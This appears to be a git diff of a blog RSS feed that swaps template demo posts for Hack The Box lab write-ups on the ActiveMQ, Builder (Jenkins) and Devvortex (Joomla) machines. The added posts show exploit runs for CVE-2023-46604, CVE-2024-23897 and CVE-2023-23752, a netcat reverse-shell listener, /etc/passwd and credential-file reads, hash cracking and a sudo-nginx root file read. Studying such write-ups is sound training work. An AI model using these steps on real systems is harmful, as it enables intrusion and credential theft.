-&lt;td&gt;The cover image path of the post.&amp;lt;br/&amp;gt;1. Start with &lt;code&gt;http://&lt;/code&gt; or &lt;code&gt;https://&lt;/code&gt;: Use web image&amp;lt;br/&amp;gt;2. Start with &lt;code&gt;/&lt;/code&gt;: For image in &lt;code&gt;public&lt;/code&gt; dir&amp;lt;br/&amp;gt;3. With none of the prefixes: Relative to the markdown file&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;tags&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;The tags of the post.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;category&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;The category of the post.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;draft&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;If this post is still a draft, which won&apos;t be displayed.&lt;/td&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;nginx&lt;/td&gt;
+&lt;td&gt;1.18.0&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2&gt;Where to Place the Post Files&lt;/h2&gt;
-&lt;p&gt;Your post files should be placed in &lt;code&gt;src/content/posts/&lt;/code&gt; directory. You can also create sub-directories to better organize your posts and assets.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;src/content/posts/
-├── post-1.md
-└── post-2/
-    ├── cover.png
-    └── index.md
-&lt;/code&gt;&lt;/pre&gt;
-</content:encoded></item><item><title>Markdown Extended Features</title><link>https://fuwari.vercel.app/posts/markdown-extended/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/markdown-extended/</guid><description>Read more about Markdown features in Fuwari</description><pubDate>Wed, 01 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;GitHub repository cards&lt;/h2&gt;
-&lt;p&gt;You can add dynamic cards that link to GitHub repositories, on page load, the repository information is pulled from the GitHub API.&lt;/p&gt;
-&lt;p&gt;::github{repo=&quot;Fabrizz/MMM-OnSpotify&quot;}&lt;/p&gt;
-&lt;p&gt;Create a GitHub repository card with the code &lt;code&gt;::github{repo=&quot;&amp;lt;owner&amp;gt;/&amp;lt;repo&amp;gt;&quot;}&lt;/code&gt;.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;::github{repo=&quot;saicaca/fuwari&quot;}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2&gt;Admonitions&lt;/h2&gt;
-&lt;p&gt;Following types of admonitions are supported: &lt;code&gt;note&lt;/code&gt; &lt;code&gt;tip&lt;/code&gt; &lt;code&gt;important&lt;/code&gt; &lt;code&gt;warning&lt;/code&gt; &lt;code&gt;caution&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;:::note
-Highlights information that users should take into account, even when skimming.
-:::&lt;/p&gt;
-&lt;p&gt;:::tip
-Optional information to help a user be more successful.
-:::&lt;/p&gt;
-&lt;p&gt;:::important
-Crucial information necessary for users to succeed.
-:::&lt;/p&gt;
-&lt;p&gt;:::warning
-Critical content demanding immediate user attention due to potential risks.
-:::&lt;/p&gt;
-&lt;p&gt;:::caution
-Negative potential consequences of an action.
-:::&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;:::note
-Highlights information that users should take into account, even when skimming.
-:::
-
-:::tip
-Optional information to help a user be more successful.
-:::
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The title of the admonition can be customized.&lt;/p&gt;
-&lt;p&gt;:::note[MY CUSTOM TITLE]
-This is a note with a custom title.
-:::&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;:::note[MY CUSTOM TITLE]
-This is a note with a custom title.
-:::
-&lt;/code&gt;&lt;/pre&gt;
-</content:encoded></item><item><title>Markdown Example</title><link>https://fuwari.vercel.app/posts/markdown/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/markdown/</guid><description>A simple example of a Markdown blog post.</description><pubDate>Sun, 01 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;An h1 header&lt;/h1&gt;
-&lt;p&gt;Paragraphs are separated by a blank line.&lt;/p&gt;
-&lt;p&gt;2nd paragraph. &lt;em&gt;Italic&lt;/em&gt;, &lt;strong&gt;bold&lt;/strong&gt;, and &lt;code&gt;monospace&lt;/code&gt;. Itemized lists
-look like:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;this one&lt;/li&gt;
-&lt;li&gt;that one&lt;/li&gt;
-&lt;li&gt;the other one&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Note that --- not considering the asterisk --- the actual text
-content starts at 4-columns in.&lt;/p&gt;
+&lt;p&gt;For now we do not try anything through ssh since we do not have valid credentials, So let’s look at the website.&lt;/p&gt;
+&lt;h3&gt;Login&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./img/login.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;As soon as I entered the website, it asked me for credentials, I tried admin:admin and magically it let me in.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/web.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We have a website with &lt;code&gt;activeMQ&lt;/code&gt;.&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Block quotes are
-written like so.&lt;/p&gt;
-&lt;p&gt;They can span multiple paragraphs,
-if you like.&lt;/p&gt;
+&lt;p&gt;What is activemq? Apache ActiveMQ is an open source message broker written in Java together with a full Java Message Service client. It provides “Enterprise Features” which in this case means fostering the communication from more than one client or server.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;Use 3 dashes for an em-dash. Use 2 dashes for ranges (ex., &quot;it&apos;s all
-in chapters 12--14&quot;). Three dots ... will be converted to an ellipsis.
-Unicode is supported. ☺&lt;/p&gt;
-&lt;h2&gt;An h2 header&lt;/h2&gt;
-&lt;p&gt;Here&apos;s a numbered list:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;first item&lt;/li&gt;
-&lt;li&gt;second item&lt;/li&gt;
-&lt;li&gt;third item&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Note again how the actual text starts at 4 columns in (4 characters
-from the left side). Here&apos;s a code sample:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# Let me re-iterate ...
-for i in 1 .. 10 { do-something(i) }
+&lt;p&gt;If we go to the section that says Manage ActiveMQ broker we can see more information.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;CVE-2023-46604 Exploit&lt;/h3&gt;
+&lt;p&gt;We searched for ActiveMQ 5.15.15 exploit CVE and found an interesting exploit:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/evkl1d/CVE-2023-46604&quot;&gt;CVE-2023-46604&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;we clone this exploit:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; git clone https://github.com/evkl1d/CVE-2023-46604
+&amp;gt; cd CVE-2023-46604
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;As you probably guessed, indented 4 spaces. By the way, instead of
-indenting the block, you can use delimited blocks, if you like:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;define foobar() {
-    print &quot;Welcome to flavor country!&quot;;
+&lt;p&gt;We listen on port 6666:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 6666
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and we edit the poc.xml that contains the exploit folder that we cloned. The line you are going to edit needs your IP of the tun0 interface and the port you are listening on, to receive the shell there.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/xml.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We create a server in python in which the exploit will take the poc.xml to attack the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/py.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We run the exploit as follows:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; python3 exploit.py -i 10.10.11.243 -u &apos;http://10.10.14.26/poc.xml&apos; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In the -u parameter we put the Python Server that we made previously.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Did you understand what I did? I explain to you Basically, we copied an exploit from github, which is dedicated for this activeMQ Vulnerability.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;in the exploit’s usage guide, it tells us that we need to create a python server which we will assign to it when we execute the attack, so that it loads the poc.xml file on the page with our IP and port on which we are already listening for receive our Revshell.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;./img/nc.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;If we put the command sudo -l it shows us this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo -l
+Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Nginx Sudo - Read root flag&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sudo -l is used to check the privileges a user has on a Unix or Linux system via the sudo command.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Okay, We can run nginx with sudo privileges without a password, Let’s deep search how we can do that.&lt;/p&gt;
+&lt;p&gt;After search, i want now to create a configration file but first we need to see nginx.conf from this path /etc/nginx/nginx.conf.&lt;/p&gt;
+&lt;p&gt;I’ll edit this file from my machine and upload on the box.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user root;
+worker_processes auto;
+events {
+       worker_connections 790;
+}
+http{
+      server {
+             listen   9000;
+             location / {
+                      root /;
+             }
+      
+      }
+
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;(which makes copying &amp;amp; pasting easier). You can optionally mark the
-delimited block for Pandoc to syntax highlight it:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import time
-# Quick, count to ten!
-for i in range(10):
-    # (but not *too* quick)
-    time.sleep(0.5)
-    print i
+&lt;p&gt;To set configuration file use this command.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nginx -c /tmp/nginx1.conf
+&amp;gt; ss -ltnp # displays TCP connections with a source port
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3&gt;An h3 header&lt;/h3&gt;
-&lt;p&gt;Now a nested list:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;First, get these ingredients:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;carrots&lt;/li&gt;
-&lt;li&gt;celery&lt;/li&gt;
-&lt;li&gt;lentils&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Boil some water.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Dump everything in the pot and follow
-this algorithm:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; find wooden spoon
- uncover pot
- stir
- cover pot
- balance wooden spoon precariously on pot handle
- wait 10 minutes
- goto first step (or shut off burner when done)
+&lt;p&gt;Now we can access root flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://localhost:9000/root/root.txt
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Do not bump wooden spoon or it will fall.&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Notice again how text always lines up on 4-space indents (including
-that last line which continues item 3 above).&lt;/p&gt;
-&lt;p&gt;Here&apos;s a link to &lt;a href=&quot;http://foo.bar&quot;&gt;a website&lt;/a&gt;, to a &lt;a href=&quot;local-doc.html&quot;&gt;local
-doc&lt;/a&gt;, and to a &lt;a href=&quot;#an-h2-header&quot;&gt;section heading in the current
-doc&lt;/a&gt;. Here&apos;s a footnote [^1].&lt;/p&gt;
-&lt;p&gt;[^1]: Footnote text goes here.&lt;/p&gt;
-&lt;p&gt;Tables can look like this:&lt;/p&gt;
-&lt;p&gt;size material color&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;9 leather brown
-10 hemp canvas natural
-11 glass transparent&lt;/p&gt;
-&lt;p&gt;Table: Shoes, their sizes, and what they&apos;re made of&lt;/p&gt;
-&lt;p&gt;(The above is the caption for the table.) Pandoc also supports
-multi-line tables:&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;keyword text&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;red Sunsets, apples, and
-other red or reddish
-things.&lt;/p&gt;
-&lt;p&gt;green Leaves, grass, frogs
-and other things it&apos;s
-not easy being.&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;A horizontal rule follows.&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;Here&apos;s a definition list:&lt;/p&gt;
-&lt;p&gt;apples
-: Good for making applesauce.
-oranges
-: Citrus!
-tomatoes
-: There&apos;s no &quot;e&quot; in tomatoe.&lt;/p&gt;
-&lt;p&gt;Again, text is indented 4 spaces. (Put a blank line between each
-term/definition pair to spread things out more.)&lt;/p&gt;
-&lt;p&gt;Here&apos;s a &quot;line block&quot;:&lt;/p&gt;
-&lt;p&gt;| Line one
-| Line too
-| Line tree&lt;/p&gt;
-&lt;p&gt;and images can be specified like so:&lt;/p&gt;
-&lt;p&gt;Inline math equations go in like so: $\omega = d\phi / dt$. Display
-math should get its own line and be put in in double-dollarsigns:&lt;/p&gt;
-&lt;p&gt;$$I = \int \rho R^{2} dV$$&lt;/p&gt;
-&lt;p&gt;And note that you can backslash-escape any punctuation characters
-which you wish to be displayed literally, ex.: `foo`, *bar*, etc.&lt;/p&gt;
-</content:encoded></item><item><title>Test</title><link>https://fuwari.vercel.app/posts/test/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/test/</guid><description>How to use this blog template.</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded/></item><item><title>Include Video in the Posts</title><link>https://fuwari.vercel.app/posts/video/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/video/</guid><description>This post demonstrates how to include embedded video in a blog post.</description><pubDate>Tue, 01 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Just copy the embed code from YouTube or other platforms, and paste it in the markdown file.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;---
-title: Include Video in the Post
-published: 2023-10-19
-// ...
----
+&lt;p&gt;Thanks for reading.&lt;/p&gt;
+</content:encoded></item><item><title>Builder HTB Writeup</title><link>https://fuwari.vercel.app/posts/builder/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/builder/</guid><description>Medium Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We start our scans with nmap.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap 10.10.11.10 -sS -p- --open -n -Pn --min-rate 3000 -vvv -oG ports 
 
-&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 62
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2&gt;YouTube&lt;/h2&gt;
-&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
-&lt;h2&gt;Bilibili&lt;/h2&gt;
-&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;//player.bilibili.com/player.html?bvid=BV1fK4y1s7Qf&amp;amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&amp;gt; &amp;lt;/iframe&amp;gt;&lt;/p&gt;
-</content:encoded></item></channel></rss>
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p8080,22 10.10.11.10 -sVC
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:De:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+8080/tcp open  http    Jetty 10.0.18
+|_http-title: Dashboard [Jenkins]
+|_http-server-header: Jetty(10.0.18)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We only have 2 ports, let’s see the website.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We look at versions:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; whatweb http://10.10.11.10:8080/  
+            
+http://10.10.11.10:8080/ [200 OK] Cookies[JSESSIONID.678bd8a0], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.678bd8a0], IP[10.10.11.10], Jenkins[2.441], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], Title[Dashboard [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Search for the version of Jenkins that we found on the web. Jenkins 4.441 exploit&lt;/p&gt;
+&lt;h3&gt;CVE-2024-23897 - Jenkins Arbitrary File Leak Vulnerability&lt;/h3&gt;
+&lt;p&gt;Download the .jar file of the vulnerable jenkins&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here you have more information about this:&lt;/p&gt;
+&lt;p&gt;https://www.zscaler.com/blogs/security-research/jenkins-arbitrary-file-leak-vulnerability-cve-2024-23897-can-lead-rce&lt;/p&gt;
+&lt;p&gt;List the /etc/passwd of the victim machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node &apos;@/etc/passwd&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Directory Structure for Jenkins&lt;/h3&gt;
+&lt;p&gt;Here i share information about the order of Jenkins directories:&lt;/p&gt;
+&lt;p&gt;https://medium.com/@knoldus/directory-structure-and-installing-plugins-in-jenkins-3dd62488631c&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We look for the username:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;java -jar jenkins-cli.jar -noCertificateCheck -s &apos;http://10.10.11.10:8080&apos; connect-node &quot;@/var/jenkins_home/users/users.xml&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:: Cada lugar tiene su config.xml&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Each user tine un config.xml file, let’s see it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;java -jar jenkins-cli.jar -noCertificateCheck -s &apos;http://10.10.11.10:8080&apos; connect-node &quot;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We find a hash in the file:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We cracked it with john:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Login in Jenkins&lt;/h3&gt;
+&lt;p&gt;Let us log in with the credentials found.&lt;/p&gt;
+&lt;p&gt;Jenkins credentials — &lt;code&gt;jennifer&lt;/code&gt; : &lt;code&gt;princess&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;If we go to the &amp;gt; Manage Jenkins &amp;gt; Credentials &amp;gt; System &amp;gt; Global Crendentials (UNrestricted)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If we inspect above the key, we can see that the ssh key is encrypted.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;How to Print Password Encryption Jenkins&lt;/h3&gt;
+&lt;p&gt;We print the key in the Jenkins Console with the following command that we found on this website:&lt;/p&gt;
+&lt;p&gt;https://stackoverflow.com/questions/25547381/what-password-encryption-jenkins-is-using&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;println(hudson.util.Secret.fromString(&quot;{encrypt hash}&quot;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;and now as usual, we save the key and give it permissions&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;ssh -i id_rsa root@10.10.11.10
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>Devvortex HTB Writeup</title><link>https://fuwari.vercel.app/posts/devvortex/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/devvortex/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We start our scanning with nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap 10.10.11.242 -sS --open --min-rate 3000 -p- -n -Pn -oN Nmapscan
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p22,80 -sVC 10.10.11.242 -Pn -oN versionScan
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we only have 2 open ports, so let’s look at the website&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After searching the entire web, i fuzz subdomains:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt
+
+Found: dev.devvortex.htb (Status: 200) [Size: 23221
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we fond another website:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When seeing the technologies of the web, we try to do fuzzing to find the joomla login panel.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt
+
+/robots.txt           (Status: 200) [Size: 764]
+/README.txt           (Status: 200) [Size: 764]
+/administrator        (Status: 301) [Size: 178] [--&amp;gt; http://dev.devvortex.htb/administrator/]
+/api                  (Status: 301) [Size: 178] [--&amp;gt; http://dev.devvortex.htb/api/]          
+/api/experiments      (Status: 406) [Size: 29]                                               
+/api/experiments/configurations (Status: 406) [Size: 29]                                     
+/cache                (Status: 301) [Size: 178] [--&amp;gt; http://dev.devvortex.htb/cache/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;in the README.txt we see the following:&lt;/p&gt;
+&lt;p&gt;http://dev.devvortex.htb/README.txt&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Here is the version, let’s look for vulnerabilities or exploits.&lt;/p&gt;
+&lt;p&gt;Search: Joomla 4.2 exploit&lt;/p&gt;
+&lt;h3&gt;CVE-2023-23752 - Exploit&lt;/h3&gt;
+&lt;p&gt;We found an interesting exploit:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/51334&quot;&gt;Exploit DB - CVE-2023-23752 &lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We download the exploit and install the necessary libraries&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo gem install docopt httpx json paint
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When executing the exploit we have the following results:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ruby exploit.rb http://dev.devvortex.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;CVE-2023-23752 - Manual&lt;/h3&gt;
+&lt;p&gt;We will run the same vulnerability, but manually, to better understand this:&lt;/p&gt;
+&lt;p&gt;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -s &apos;http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&apos; | ./jq-linux-amd64 | grep -E &apos;user|password&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We also found information that could be useful to us in the same file&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;CVE-2023-23752 - My Script&lt;/h3&gt;
+&lt;p&gt;I have also created a script for this, so you have more options: https://github.com/mil4ne/CVE-2023-23752-Joomla-v4.2.8/&lt;/p&gt;
+&lt;p&gt;With these credentials we try to log in to the Joomla panel.&lt;/p&gt;
+&lt;h3&gt;Get shell&lt;/h3&gt;
